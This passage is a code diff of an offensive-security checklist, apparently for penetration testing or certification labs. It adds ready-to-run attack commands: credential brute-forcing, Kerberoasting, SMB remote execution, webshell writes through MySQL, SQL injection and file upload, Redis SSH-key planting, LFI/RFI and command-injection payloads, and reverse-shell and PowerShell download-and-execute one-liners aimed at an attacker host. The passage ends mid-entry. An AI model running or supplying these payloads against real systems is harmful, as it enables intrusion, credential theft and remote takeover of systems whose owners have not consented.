+            "subdesc": "Search for passwords, tokens, connection strings, or other secrets in the codebase.",
+            "cmd": [
+              "grep -r 'password\\|secret\\|token\\|api_key\\|connectionString' /path/to/git-directory"
+            ]
+          },
+          {
+            "desc": "Common .git files to check manually",
+            "subdesc": "If git-dumper fails, try fetching these files individually via curl.",
+            "cmd": [
+              "/.git/config",
+              "/.git/packed-refs",
+              "/.git/HEAD",
+              "/.git/description",
+              "/.git/shallow"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "recon-35",
+        "name": "API Enumeration",
+        "description": "Discover and enumerate API endpoints. API paths often follow /api_name/v1 or /api_name/v2 patterns. A 405 Method Not Allowed (instead of 404) means the endpoint exists but needs a different HTTP method.",
+        "commands": [
+          {
+            "desc": "Gobuster with API pattern file",
+            "subdesc": "Create a pattern file with lines like {GOBUSTER}/v1 and {GOBUSTER}/v2 to fuzz versioned API endpoints.",
+            "cmd": [
+              "gobuster dir -u http://<TARGET_IP>:<PORT> -w /usr/share/wordlists/dirb/big.txt -p <pattern_file>"
+            ]
+          },
+          {
+            "desc": "Probe discovered API endpoints with curl",
+            "subdesc": "Start with GET to check the response, then try POST/PUT if you get 405 Method Not Allowed.",
+            "cmd": [
+              "curl -i http://<TARGET_IP>:<PORT>/users/v1",
+              "curl -i http://<TARGET_IP>:<PORT>/users/v1/admin"
+            ]
+          },
+          {
+            "desc": "Register a new user via API (POST)",
+            "subdesc": "Many APIs allow self-registration. Try including an admin key in the JSON body to escalate privileges.",
+            "cmd": [
+              "curl -X POST http://<TARGET_IP>:<PORT>/users/v1/register -H 'Content-Type: application/json' -d '{\"username\":\"test\",\"password\":\"test123\",\"email\":\"test@test.com\"}'",
+              "curl -X POST http://<TARGET_IP>:<PORT>/users/v1/register -H 'Content-Type: application/json' -d '{\"username\":\"test\",\"password\":\"test123\",\"email\":\"test@test.com\",\"admin\":true}'"
+            ]
+          },
+          {
+            "desc": "Authenticate and get JWT token",
+            "subdesc": "Use the token from the login response in subsequent requests as a Bearer token or in the Authorization header.",
+            "cmd": [
+              "curl -X POST http://<TARGET_IP>:<PORT>/users/v1/login -H 'Content-Type: application/json' -d '{\"username\":\"test\",\"password\":\"test123\"}'"
+            ]
+          },
+          {
+            "desc": "Change password via PUT/PATCH with JWT",
+            "subdesc": "If you have a valid JWT, try changing another user's password by targeting their username in the URL.",
+            "cmd": [
+              "curl -X PUT http://<TARGET_IP>:<PORT>/users/v1/admin/password -H 'Content-Type: application/json' -H 'Authorization: Bearer <JWT_TOKEN>' -d '{\"password\":\"newpass123\"}'"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "recon-36",
+        "name": "Internal Network Scanning (Pivoting)",
+        "description": "When you have a foothold on a compromised host, use these one-liners to discover other hosts and open ports on the internal network without uploading tools.",
+        "commands": [
+          {
+            "desc": "Windows – Subnet host discovery (PowerShell)",
+            "subdesc": "Pings each IP in a /24 subnet and shows which hosts are alive. Useful when nmap is not available on the target.",
+            "cmd": [
+              "1..254 | ForEach-Object { $ip = \"<SUBNET>.$_\"; $result = Get-WmiObject Win32_PingStatus -Filter \"Address='$ip' AND Timeout=200\"; if ($result.StatusCode -eq 0) { Write-Host \"$ip is alive\" } }"
+            ]
+          },
+          {
+            "desc": "Windows – Port scan (PowerShell)",
+            "subdesc": "Scans all ports 1-1024 on a single target. Slow but works without any tools installed.",
+            "cmd": [
+              "1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect(\"<TARGET_IP>\", $_)) \"TCP port $_ is open\" } 2>$null"
+            ]
+          },
+          {
+            "desc": "Windows – Scan specific ports (PowerShell)",
+            "subdesc": "Target high-value ports only for faster results during time-limited engagements.",
+            "cmd": [
+              "@(21,22,25,53,80,88,135,139,389,443,445,636,1433,3306,3389,5432,5985,8080) | % { try { $t = New-Object Net.Sockets.TcpClient; $t.Connect(\"<TARGET_IP>\", $_); Write-Host \"Port $_ open\"; $t.Close() } catch {} }"
+            ]
+          },
+          {
+            "desc": "Linux – Subnet host discovery (bash)",
+            "subdesc": "Simple ping sweep using a for loop. Works on minimal Linux installs.",
+            "cmd": [
+              "for i in $(seq 254); do ping -c 1 -W 1 <SUBNET>.$i | grep 'from' &; done; wait"
+            ]
+          },
+          {
+            "desc": "Linux – Port scan (bash + netcat)",
+            "subdesc": "Full port scan using netcat. Very slow for all 65535 ports — consider limiting the range.",
+            "cmd": [
+              "for port in {1..65535}; do nc -zvw1 <TARGET_IP> $port 2>&1 | grep 'open'; done"
+            ]
+          },
+          {
+            "desc": "Banner grabbing with netcat",
+            "subdesc": "Connect to a port and read the service banner. Helps identify service versions without nmap.",
+            "cmd": [
+              "nc -nv <TARGET_IP> <PORT>"
             ]
           }
         ]
@@ -1656,16 +2812,263 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Using Searchsploit",
-            "subdesc": "",
+            "subdesc": "Map discovered services and versions to known public exploits in ExploitDB",
             "cmd": [
               "searchsploit <SERVICE/VERSION>"
             ]
           },
           {
             "desc": "Using SICAT exploit finder [https://github.com/justakazh/sicat]",
-            "subdesc": "Search for vulnerabilities and exploits from multiple high-profile sources (ExploitDB, NVD NIST, CVE.org, Github)",
+            "subdesc": "Search for vulnerabilities and exploits from multiple high-profile sources (ExploitDB, NVD NIST, CVE.org, Github). Install: git clone https://github.com/justakazh/sicat.git && cd sicat && pip install -r requirements.txt",
             "cmd": [
               "sicat -k <SERVICE/VERSION>"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-2",
+        "name": "FTP Credential Attack (21)",
+        "description": "Brute force/default creds on FTP.",
+        "commands": [
+          {
+            "desc": "Brute Force FTP Credentials",
+            "subdesc": "Use Hydra or Medusa to spray credentials against FTP. Try anonymous:anonymous first before brute forcing.",
+            "cmd": [
+              "hydra -L users.txt -P passwords.txt ftp://<TARGET_IP>",
+              "medusa -h <TARGET_IP> -u <USER> -P passwords.txt -M ftp"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-3",
+        "name": "SSH Credential Attack (22)",
+        "description": "Password spray and valid credential validation.",
+        "commands": [
+          {
+            "desc": "Brute Force SSH & Validate Access",
+            "subdesc": "Spray credentials with Hydra, then validate by connecting. Use -t 4 to limit threads and avoid lockouts.",
+            "cmd": [
+              "hydra -L users.txt -P rockyou.txt ssh://<TARGET_IP>",
+              "ssh <USER>@<TARGET_IP>"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-4",
+        "name": "SMTP Relay / VRFY Abuse (25/465/587)",
+        "description": "Test relay misconfig and user enumeration.",
+        "commands": [
+          {
+            "desc": "Test Open Relay & Enumerate Users",
+            "subdesc": "Use swaks to test if the server relays mail for arbitrary domains. Use Nmap scripts to enumerate valid users via VRFY/EXPN/RCPT.",
+            "cmd": [
+              "swaks --to test@domain.local --from attacker@domain.local --server <TARGET_IP>",
+              "nmap --script smtp-open-relay,smtp-enum-users -p25,465,587 <TARGET_IP>"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-5",
+        "name": "IMAP/POP Mailbox Brute (110/143/993/995)",
+        "description": "Mailbox auth attacks.",
+        "commands": [
+          {
+            "desc": "Brute Force IMAP & POP3 Mailboxes",
+            "subdesc": "Spray credentials against IMAP (143/993) and POP3 (110/995). Valid creds may yield emails containing passwords, internal URLs, or sensitive attachments.",
+            "cmd": [
+              "hydra -L users.txt -P passwords.txt imap://<TARGET_IP>",
+              "hydra -L users.txt -P passwords.txt pop3://<TARGET_IP>"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-6",
+        "name": "Windows: Kerberos AS-REP / Kerberoast (88)",
+        "description": "Domain credential extraction via Kerberos.",
+        "commands": [
+          {
+            "desc": "AS-REP Roasting & Kerberoasting",
+            "subdesc": "GetNPUsers targets accounts with 'Do not require Kerberos pre-auth'. GetUserSPNs requests TGS tickets for service accounts — crack offline with hashcat.",
+            "cmd": [
+              "impacket-GetNPUsers <DOMAIN>/ -dc-ip <TARGET_IP> -usersfile users.txt -format hashcat",
+              "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <TARGET_IP> -request"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-7",
+        "name": "RPC/SMB Null Session & Share Abuse (135/139/445)",
+        "description": "Anonymous/domain share abuse paths.",
+        "commands": [
+          {
+            "desc": "Null Session & Share Enumeration",
+            "subdesc": "rpcclient with empty creds tests null session access. CrackMapExec enumerates accessible shares with valid domain credentials.",
+            "cmd": [
+              "rpcclient -U \"\" -N <TARGET_IP>",
+              "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --shares"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-8",
+        "name": "SMB Remote Exec (445)",
+        "description": "Command execution through SMB with valid creds/hash.",
+        "commands": [
+          {
+            "desc": "Remote Execution via SMB",
+            "subdesc": "PsExec uploads a service binary and executes as SYSTEM. SmbExec creates a service without uploading — stealthier. Both require admin creds or NTLM hash.",
+            "cmd": [
+              "impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
+              "impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-9",
+        "name": "Windows: LDAP Credentialed Abuse (389/636/3268/3269)",
+        "description": "Enumerate AD abuse paths with valid creds.",
+        "commands": [
+          {
+            "desc": "LDAP Queries & BloodHound Collection",
+            "subdesc": "ldapsearch queries AD directly for users, groups, and policies. BloodHound.py collects the full AD graph for attack path analysis.",
+            "cmd": [
+              "ldapsearch -x -H ldap://<TARGET_IP> -D \"<USER_DN>\" -w <PASS> -b \"dc=domain,dc=local\"",
+              "python3 bloodhound.py -c All -u <USER> -p <PASS> -d <DOMAIN> -ns <TARGET_IP>"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-11",
+        "name": "MSSQL Command Execution (1433)",
+        "description": "Leverage SQL Server to execute OS commands.",
+        "commands": [
+          {
+            "desc": "Connect & Enable xp_cmdshell",
+            "subdesc": "Authenticate with impacket-mssqlclient, then enable xp_cmdshell for OS command execution. Requires sysadmin role or sa credentials.",
+            "cmd": [
+              "impacket-mssqlclient <USER>:<PASS>@<TARGET_IP>",
+              "EXEC sp_configure \"xp_cmdshell\",1;RECONFIGURE;EXEC xp_cmdshell \"whoami\";"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-14",
+        "name": "Oracle Account/SID Abuse (1521)",
+        "description": "Exploit weak Oracle credentials and misconfig.",
+        "commands": [
+          {
+            "desc": "Oracle Brute Force & Full Audit",
+            "subdesc": "ODAT (Oracle Database Attacking Tool) automates SID guessing, credential brute forcing, and privilege escalation. 'all' mode runs every available module.",
+            "cmd": [
+              "odat passwordguesser -s <TARGET_IP> -d <SID>",
+              "odat all -s <TARGET_IP> -d <SID> -U <USER> -P <PASS>"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-10",
+        "name": "NFS no_root_squash Abuse (2049)",
+        "description": "Exploit writable NFS exports for privesc foothold.",
+        "commands": [
+          {
+            "desc": "Mount & Plant SUID Binary",
+            "subdesc": "If no_root_squash is set on the export, root on the attacker can write SUID binaries that execute as root on the target.",
+            "cmd": [
+              "mkdir /tmp/nfs",
+              "mount -t nfs <TARGET_IP>:/<SHARE> /tmp/nfs",
+              "cp /bin/bash /tmp/nfs/bash && chmod +s /tmp/nfs/bash"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-12",
+        "name": "MySQL UDF / File Write Abuse (3306)",
+        "description": "Abuse FILE/UDF permissions on MySQL.",
+        "commands": [
+          {
+            "desc": "Login & Write Webshell via OUTFILE",
+            "subdesc": "Check secure_file_priv — if empty or set to a web directory, you can write a PHP webshell. UDF plugins allow OS command execution.",
+            "cmd": [
+              "mysql -h <TARGET_IP> -u <USER> -p",
+              "SELECT @@secure_file_priv;",
+              "SELECT \"<?php system($_GET[c]); ?>\" INTO OUTFILE \"/var/www/html/shell.php\";"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-17",
+        "name": "RDP Password Spray (3389)",
+        "description": "Credential attack and desktop access validation.",
+        "commands": [
+          {
+            "desc": "Brute Force RDP & Connect",
+            "subdesc": "Crowbar is purpose-built for RDP brute forcing (install: pip install crowbar). On success, use xfreerdp for full GUI access or add /cert-ignore for self-signed certs.",
+            "cmd": [
+              "crowbar -b rdp -s <TARGET_IP>/32 -u <USER> -C passwords.txt",
+              "xfreerdp /u:<USER> /p:<PASS> /v:<TARGET_IP>"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-13",
+        "name": "PostgreSQL Command Exec (5432)",
+        "description": "Use PostgreSQL feature abuse for command execution.",
+        "commands": [
+          {
+            "desc": "Connect & Execute OS Commands",
+            "subdesc": "COPY TO PROGRAM executes shell commands through PostgreSQL — requires superuser privileges. Can be used for reverse shells.",
+            "cmd": [
+              "psql -h <TARGET_IP> -U <USER>",
+              "COPY (SELECT \"bash -c 'id'\") TO PROGRAM \"bash\";"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-15",
+        "name": "Redis Unauthorized Write (6379)",
+        "description": "Turn unauth Redis into persistence/RCE foothold.",
+        "commands": [
+          {
+            "desc": "Write SSH Key via Unauthenticated Redis",
+            "subdesc": "If Redis is exposed without auth, redirect the DB file to /root/.ssh/authorized_keys and write your public key. Also works for crontab or webshell writes.",
+            "cmd": [
+              "redis-cli -h <TARGET_IP>",
+              "CONFIG SET dir /root/.ssh",
+              "CONFIG SET dbfilename authorized_keys",
+              "SET crack \"<PUBKEY>\"",
+              "SAVE"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploit-16",
+        "name": "MongoDB Unauth Data Access (27017)",
+        "description": "Exploit unauth MongoDB exposure.",
+        "commands": [
+          {
+            "desc": "Connect & Dump Databases",
+            "subdesc": "Default MongoDB installs have no auth. Connect directly and enumerate databases, collections, and sensitive documents.",
+            "cmd": [
+              "mongo --host <TARGET_IP> --port 27017",
+              "show dbs",
+              "use admin",
+              "show collections"
             ]
           }
         ]
@@ -1677,18 +3080,21 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Basic Tests",
-            "subdesc": "",
+            "subdesc": "Try each in login fields, URL params, and POST body. Watch for error messages or behavioral changes",
             "cmd": [
               "'",
               "' OR 1=1-- -",
               "' OR 1=1#",
               "\" OR 1=1#",
-              "'OR '' = '"
+              "'OR '' = '",
+              "valid' or 1=1--+",
+              "valid' or 1=1#",
+              "valid\" or 1=1#"
             ]
           },
           {
             "desc": "Enumerate Columns",
-            "subdesc": "",
+            "subdesc": "Increment ORDER BY until error to find number of columns, then match with UNION SELECT NULLs",
             "cmd": [
               "' ORDER BY 1-- //",
               "' UNION SELECT NULL,NULL,NULL--"
@@ -1696,7 +3102,7 @@ const checklistPhases = [
           },
           {
             "desc": "UNION Data Extraction",
-            "subdesc": "",
+            "subdesc": "Replace NULLs with column names once you know the count. Use information_schema to discover tables/columns",
             "cmd": [
               "' UNION SELECT database(), user(), @@version, null, null -- //",
               "' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //",
@@ -1704,8 +3110,17 @@ const checklistPhases = [
             ]
           },
           {
+            "desc": "MySQL Enumeration Queries",
+            "subdesc": "Run inside a SQL session or inject via UNION to gather server info and privileges",
+            "cmd": [
+              "SELECT @@hostname, @@tmpdir, @@version, @@version_compile_machine, @@plugin_dir;",
+              "SHOW GRANTS;",
+              "SHOW VARIABLES;"
+            ]
+          },
+          {
             "desc": "UNION Webshell",
-            "subdesc": "",
+            "subdesc": "Requires FILE privilege and known writable web directory. Check secure_file_priv first",
             "cmd": [
               "' UNION SELECT \"<?php system($_GET['cmd']);?>\", null INTO OUTFILE \"/var/www/html/tmp/webshell.php\" -- //",
               "<TARGET>/tmp/webshell.php?cmd=id"
@@ -1713,15 +3128,22 @@ const checklistPhases = [
           },
           {
             "desc": "Blind Boolean",
-            "subdesc": "",
+            "subdesc": "Infer data one character at a time by observing TRUE/FALSE page differences. Use Burp Intruder Sniper/Cluster Bomb",
             "cmd": [
               "' AND (SELECT 'a' FROM users LIMIT 1)='a",
               "' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)>'m"
             ]
           },
           {
+            "desc": "Oracle Blind (SUBSTR)",
+            "subdesc": "Oracle uses SUBSTR instead of SUBSTRING. Use Burp Cluster Bomb to iterate position and character",
+            "cmd": [
+              "' AND SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a"
+            ]
+          },
+          {
             "desc": "Time-Based Blind",
-            "subdesc": "",
+            "subdesc": "When no visible difference — use time delays to infer TRUE/FALSE conditions",
             "cmd": [
               "' IF (1=1) WAITFOR DELAY '0:0:10';--",
               "'||pg_sleep(10)--"
@@ -1729,7 +3151,7 @@ const checklistPhases = [
           },
           {
             "desc": "SQLmap",
-            "subdesc": "",
+            "subdesc": "Use -r with a saved Burp request for complex injection points. --os-shell requires FILE priv",
             "cmd": [
               "sqlmap -u \"http://<TARGET_IP>/page?id=1\" -p id --dbs --batch",
               "sqlmap -u \"http://<TARGET_IP>/page?id=1\" -p id --dump",
@@ -1741,11 +3163,11 @@ const checklistPhases = [
       {
         "id": "exploit-19",
         "name": "Local File Inclusion (LFI)",
-        "description": "Path traversal, PHP wrappers (filter, data, zip), log poisoning, and encoding bypasses.",
+        "description": "Path traversal, PHP wrappers (filter, data, zip, zlib), log poisoning, and encoding bypasses.",
         "commands": [
           {
             "desc": "Directory Traversal",
-            "subdesc": "",
+            "subdesc": "Try multiple depths. Use ....// to bypass simple ../ stripping filters",
             "cmd": [
               "../../../etc/passwd",
               "....//....//....//etc/passwd",
@@ -1753,29 +3175,59 @@ const checklistPhases = [
             ]
           },
           {
-            "desc": "Null Byte (PHP <5.3)",
-            "subdesc": "",
+            "desc": "From Existent Folder",
+            "subdesc": "Start traversal from a known valid directory to bypass path validation",
+            "cmd": [
+              "/var/www/images/../../../etc/passwd"
+            ]
+          },
+          {
+            "desc": "Null Byte (Only works in versions BEFORE PHP 5.3.4)",
+            "subdesc": "Terminates the string early, bypassing appended extensions",
             "cmd": [
               "../../../etc/passwd%00"
             ]
           },
           {
             "desc": "URL Encoding Bypass",
-            "subdesc": "",
+            "subdesc": "Double-encode or use alternate UTF-8 representations to bypass WAF/filters",
             "cmd": [
-              "/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+              "/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+              "..%c0%af..%c0%af..%c0%afetc/passwd",
+              "..%252f..%252f..%252fetc/passwd"
             ]
           },
           {
-            "desc": "PHP Filter (read source)",
-            "subdesc": "",
+            "desc": "Path Truncation",
+            "subdesc": "Exceed max path length (4096 Linux / 256 Windows) to truncate appended extensions",
+            "cmd": [
+              "../../../etc/passwd/./././././././[...repeat to 4096+ chars]"
+            ]
+          },
+          {
+            "desc": "PHP Filter (Base64)",
+            "subdesc": "Read source code without execution. Decode the base64 output to see PHP source",
             "cmd": [
               "php://filter/convert.base64-encode/resource=index.php"
             ]
           },
           {
+            "desc": "PHP Filter (ROT13)",
+            "subdesc": "Alternative to base64 — use ROT13 to bypass keyword filters, then decode",
+            "cmd": [
+              "php://filter/read=string.rot13/resource=index.php"
+            ]
+          },
+          {
+            "desc": "PHP Zlib Wrapper",
+            "subdesc": "Compress/decompress data streams — useful when other wrappers are blocked",
+            "cmd": [
+              "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
+            ]
+          },
+          {
             "desc": "PHP Data Wrapper (RCE)",
-            "subdesc": "",
+            "subdesc": "Requires allow_url_include=On. Base64 variant bypasses WAF keyword detection",
             "cmd": [
               "data://text/plain,<?php echo system('ls');?>",
               "echo -n '<?php echo system($_GET[\"cmd\"]);?>' | base64",
@@ -1784,7 +3236,7 @@ const checklistPhases = [
           },
           {
             "desc": "PHP ZIP Wrapper",
-            "subdesc": "",
+            "subdesc": "Upload a zip-disguised-as-image containing a PHP payload, then include it",
             "cmd": [
               "echo '<?php system($_GET[\"cmd\"]); ?>' > payload.php",
               "zip payload.zip payload.php; mv payload.zip shell.jpg",
@@ -1793,14 +3245,21 @@ const checklistPhases = [
           },
           {
             "desc": "Log Poisoning (Apache)",
-            "subdesc": "Inject <?php system($_GET['cmd']); ?> in User-Agent via Burp, then include the log file",
+            "subdesc": "Inject <?php system($_GET['cmd']); ?> in User-Agent header via Burp, then include the log file",
             "cmd": [
               "<TARGET>/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami"
             ]
           },
           {
+            "desc": "Log Poisoning (Windows XAMPP)",
+            "subdesc": "Same technique but with Windows log paths",
+            "cmd": [
+              "<TARGET>/index.php?page=C:\\xampp\\apache\\logs\\access.log&cmd=whoami"
+            ]
+          },
+          {
             "desc": "Key Files",
-            "subdesc": "",
+            "subdesc": "Common LFI target files — read credentials, SSH keys, and system configs",
             "cmd": [
               "/etc/passwd",
               "/home/<user>/.ssh/id_rsa"
@@ -1811,13 +3270,19 @@ const checklistPhases = [
       {
         "id": "exploit-20",
         "name": "Remote File Inclusion (RFI)",
-        "description": "Remote file inclusion via HTTP/SMB. Requires allow_url_include enabled.",
+        "description": "Remote file inclusion via HTTP/SMB. Requires allow_url_include enabled in php.ini.",
         "commands": [
           {
-            "desc": "Basic RFI",
-            "subdesc": "",
+            "desc": "HTTP-Based RFI",
+            "subdesc": "Host a PHP shell on your attacker machine and include it via the vulnerable parameter",
             "cmd": [
-              "http://<TARGET>/index.php?page=http://<LHOST>/shell.php",
+              "http://<TARGET>/index.php?page=http://<LHOST>/shell.php"
+            ]
+          },
+          {
+            "desc": "SMB-Based RFI",
+            "subdesc": "Use UNC path to include a file from your SMB share — bypasses some HTTP URL filters",
+            "cmd": [
               "http://<TARGET>/index.php?page=\\\\<LHOST>\\shell.php"
             ]
           },
@@ -1830,7 +3295,7 @@ const checklistPhases = [
           },
           {
             "desc": "curl RFI",
-            "subdesc": "",
+            "subdesc": "Test RFI with command execution in one shot",
             "cmd": [
               "curl \"http://<TARGET>/index.php?page=http://<LHOST>/simple-backdoor.php&cmd=ls\""
             ]
@@ -1844,26 +3309,28 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Injection Operators",
-            "subdesc": "",
+            "subdesc": "Try each operator — behavior differs: ; always runs, && only on success, || only on failure, | pipes output",
             "cmd": [
               "; id",
               "| id",
               "$(id)",
               "`id`",
               "&& id",
-              "|| id"
+              "|| id",
+              "> /tmp/output",
+              "< /etc/passwd"
             ]
           },
           {
             "desc": "curl POST Test",
-            "subdesc": "",
+            "subdesc": "URL-encode the operator (%3B = ;) when injecting through HTTP parameters",
             "cmd": [
               "curl -X POST --data 'param=value%3Bid' http://<TARGET>:<PORT>/endpoint"
             ]
           },
           {
             "desc": "CMD vs PowerShell Detect",
-            "subdesc": "",
+            "subdesc": "Determine which shell environment handles injection — affects payload choice",
             "cmd": [
               "(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell"
             ]
@@ -1881,7 +3348,7 @@ const checklistPhases = [
           },
           {
             "desc": "Bypass Spaces",
-            "subdesc": "",
+            "subdesc": "Replace spaces with URL encoding or IFS variable to evade input filters",
             "cmd": [
               "%20",
               "${IFS}"
@@ -1892,34 +3359,39 @@ const checklistPhases = [
       {
         "id": "exploit-22",
         "name": "File Upload Bypass",
-        "description": "Extension bypasses, null bytes, .htaccess override, RTLO trick, and directory traversal upload.",
+        "description": "Extension bypasses, null bytes, .htaccess override, RTLO trick, special chars, and directory traversal upload.",
         "commands": [
           {
             "desc": "Alt Extensions",
-            "subdesc": "",
+            "subdesc": "Try each PHP-equivalent extension. Also try UPPERCASE variants",
             "cmd": [
               ".phps .php7 .phtml .pht .phar {UPPERCASE}"
             ]
           },
           {
             "desc": "Null Byte / Double Extension",
-            "subdesc": "",
+            "subdesc": "Null byte terminates the string; double extension may confuse validation logic",
             "cmd": [
               "file.php%00.jpg",
               "file.jpg.php"
             ]
           },
           {
-            "desc": "NTFS Tricks",
-            "subdesc": "",
+            "desc": "NTFS / Special Char Tricks",
+            "subdesc": "Server may strip trailing chars but validation checks full name",
             "cmd": [
               "file.php......    # trailing dots",
-              "file.php%20       # trailing space"
+              "file.php%20       # trailing space",
+              "file.php%0d%0a.jpg  # CRLF injection",
+              "file.php%0a        # newline",
+              "file.php/          # trailing slash",
+              "file.php.\\        # trailing backslash",
+              "file.php/./././.   # multiple special chars"
             ]
           },
           {
             "desc": ".htaccess Override",
-            "subdesc": "",
+            "subdesc": "Upload .htaccess first to make Apache treat custom extensions as PHP",
             "cmd": [
               "echo \"AddType application/x-httpd-php .dork\" > .htaccess",
               "# Upload shell as shell.dork"
@@ -1927,16 +3399,23 @@ const checklistPhases = [
           },
           {
             "desc": "RTLO Trick",
-            "subdesc": "",
+            "subdesc": "Right-To-Left Override character reverses displayed text",
             "cmd": [
               "name.%E2%80%AEphp.jpg > name.gpj.php"
             ]
           },
           {
             "desc": "SSH Key via Dir Traversal",
-            "subdesc": "Upload your id_rsa.pub content",
+            "subdesc": "Upload your id_rsa.pub content with path traversal in filename",
             "cmd": [
               "# filename: ../../../../root/.ssh/authorized_keys"
+            ]
+          },
+          {
+            "desc": "Find Webroot",
+            "subdesc": "If webroot path is unknown, brute force common directories to find where uploads land",
+            "cmd": [
+              "gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x php,txt"
             ]
           }
         ]
@@ -1948,14 +3427,14 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Test Characters",
-            "subdesc": "",
+            "subdesc": "Inject these in input fields and check if they render unescaped in the response",
             "cmd": [
               "< > ' \" { } ;"
             ]
           },
           {
             "desc": "Reflected XSS",
-            "subdesc": "",
+            "subdesc": "Try multiple HTML elements — <img> and <svg> bypass basic <script> filters",
             "cmd": [
               "<script>alert('XSS')</script>",
               "<img src=x onerror=alert('XSS')>",
@@ -1979,47 +3458,85 @@ const checklistPhases = [
         ]
       },
       {
-        "id": "exploit-cms",
-        "name": "Content Management Systems",
-        "description": "WordPress wpscan, theme editor RCE, Drupal droopescan, and Joomla joomscan.",
+        "id": "exploit-revshells",
+        "name": "Reverse Shells",
+        "description": "Common reverse shell one-liners for Linux (bash, Python, netcat) and Windows (PowerShell, powercat, Nishang).",
         "commands": [
           {
-            "desc": "WordPress: Enumeration",
-            "subdesc": "",
+            "desc": "Bash",
+            "subdesc": "Most reliable Linux reverse shell — works on most systems with /dev/tcp support",
             "cmd": [
-              "wpscan --url http://<TARGET> --enumerate vp,vt,dbe"
+              "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
             ]
           },
           {
-            "desc": "WordPress: Brute Force",
-            "subdesc": "",
+            "desc": "Python",
+            "subdesc": "Works on any system with Python installed — check python vs python3",
             "cmd": [
-              "wpscan --url http://<TARGET> -U users.txt -P /usr/share/wordlists/rockyou.txt"
+              "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
             ]
           },
           {
-            "desc": "WordPress: Theme Editor RCE",
-            "subdesc": "Appearance > Theme Editor > 404.php",
+            "desc": "Netcat (traditional)",
+            "subdesc": "First form needs nc with -e flag. Second (mkfifo) works on all netcat versions",
             "cmd": [
-              "# Inject into 404.php:",
-              "<?php system($_GET['cmd']); ?>",
-              "",
-              "# Access:",
-              "/wp-content/themes/<theme>/404.php?cmd=id"
+              "nc -e /bin/bash <LHOST> <LPORT>",
+              "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"
             ]
           },
           {
-            "desc": "Drupal",
-            "subdesc": "",
+            "desc": "PHP",
+            "subdesc": "Useful when PHP CLI is available — common on web servers",
             "cmd": [
-              "droopescan scan drupal -u http://<TARGET>"
+              "php -r '$sock=fsockopen(\"<LHOST>\",<LPORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
             ]
           },
           {
-            "desc": "Joomla",
-            "subdesc": "",
+            "desc": "PowerShell (powercat)",
+            "subdesc": "Download powercat to target, then execute reverse shell",
             "cmd": [
-              "joomscan -u http://<TARGET>"
+              "IEX (New-Object System.Net.Webclient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e powershell"
+            ]
+          },
+          {
+            "desc": "PowerShell (IWR)",
+            "subdesc": "Download and execute a PS reverse shell script from attacker",
+            "cmd": [
+              "powershell -c 'IEX(IWR http://<LHOST>:<LPORT>/revshell.ps1 -UseBasicParsing)'"
+            ]
+          },
+          {
+            "desc": "Nishang Invoke-PowerShellTcp",
+            "subdesc": "Full-featured PS reverse shell. Add the function call at the end of the .ps1 file before hosting",
+            "cmd": [
+              "# Add to end of Invoke-PowerShellTcp.ps1:",
+              "Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>",
+              "# Then host and trigger download+exec on target"
+            ]
+          },
+          {
+            "desc": "Listener",
+            "subdesc": "Start listener BEFORE triggering the reverse shell on the target",
+            "cmd": [
+              "nc -lvnp <LPORT>"
+            ]
+          },
+          {
+            "desc": "Shell Upgrade (Linux)",
+            "subdesc": "Upgrade a dumb shell to a fully interactive TTY",
+            "cmd": [
+              "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+              "# Ctrl+Z, then:",
+              "stty raw -echo; fg",
+              "export TERM=xterm"
+            ]
+          },
+          {
+            "desc": "WinPEAS Tip",
+            "subdesc": "Run WinPEAS with cmd.exe not PowerShell. Enable colored output with VirtualTerminalLevel",
+            "cmd": [
